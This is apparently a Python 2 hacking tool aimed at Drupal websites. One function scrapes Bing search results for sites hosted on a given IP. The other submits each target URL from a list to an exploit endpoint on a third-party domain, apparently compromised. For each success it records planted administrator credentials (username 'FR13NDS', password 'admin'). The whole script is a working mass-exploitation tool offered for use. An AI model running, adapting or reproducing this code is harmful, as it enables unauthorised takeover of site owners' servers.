import urllib,re,sys,json
from urlparse import urlparse

try:
    import urllib2
except:
    print('You need urllib2 library installed.')


try:
    from bs4 import BeautifulSoup
except:
    print('You need BeautifulSoup 4 library installed.')

def drupalextractor():
    ip  = raw_input('2- Ip : ')
    page  = 1
    sites = list()
    while page <= 50 :
     
      url   = "http://www.bing.com/search?q=ip%3A"+ip+"+node&go=Valider&qs=ds&form=QBRE&first="+str(page)
      req   = urllib2.Request(url)
      opreq = urllib2.urlopen(req).read()
      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
      page += 1
     
      for url in findurl :
                             split = urlparse(url)
                             site   = split.netloc
                             if site not in sites :
                                      print site
                                      sites.append(site)
def massexploiter():
        listop = raw_input("Enter The list Txt :")
        fileopen = open(listop,'r')
        content = fileopen.readlines()
        for i in content :
                url=i.strip()
                try :
                        openurl = urllib2.urlopen('http://www.thelaundrybasket.ae/admin/Drupal7.php?url='+url+'&submit=submit')
                        readcontent = openurl.read()
                        if  "Success" in readcontent :
                                print "[+]Success =>"+url
                                print "[-]username:FR13NDS\n[-]password:admin"
                                save = open('drupal.txt','a')
                                save.write(url+"\n"+"[-]username:Fr13nds\n[-]password:admin\n")
                               
                        else :
                                print i + "=> exploit not found "
                except Exception as ex :
                                print ex
def init():
    
    print('\n[1]-Get Drupal Website')
    print('[2]-List Of IPs\n')
    choose = raw_input('Enter Option : ')
    if choose.isdigit():
        choose = int(choose)
        pass
    else :
        print('Choose From List Bro')
        exit()
    if choose == 1:
        drupalextractor()
    if choose == 2:
        massexploiter()


